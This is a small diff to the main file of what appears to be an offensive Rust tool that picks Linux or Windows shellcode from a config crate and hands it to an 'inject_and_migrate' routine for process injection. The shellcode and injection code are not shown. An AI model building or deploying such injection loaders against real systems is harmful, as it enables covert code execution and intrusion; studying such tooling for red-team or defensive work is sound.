@@ -1,17 +1,18 @@
-// Load configuration values
-mod config;
-
 // Load the appropriate operating system's implementation
 #[cfg(target_os = "linux")]
 mod rco_process_migration_linux;
 #[cfg(target_os = "linux")]
 use rco_process_migration_linux::inject_and_migrate;
+#[cfg(target_os = "linux")]
+const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
 
 #[cfg(windows)]
 mod rco_process_migration_windows;
 #[cfg(windows)]
 use rco_process_migration_windows::inject_and_migrate;
+#[cfg(windows)]
+const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
 
 fn main() {
-    inject_and_migrate(config::SHELLCODE);
+    inject_and_migrate(SHELLCODE);
 }
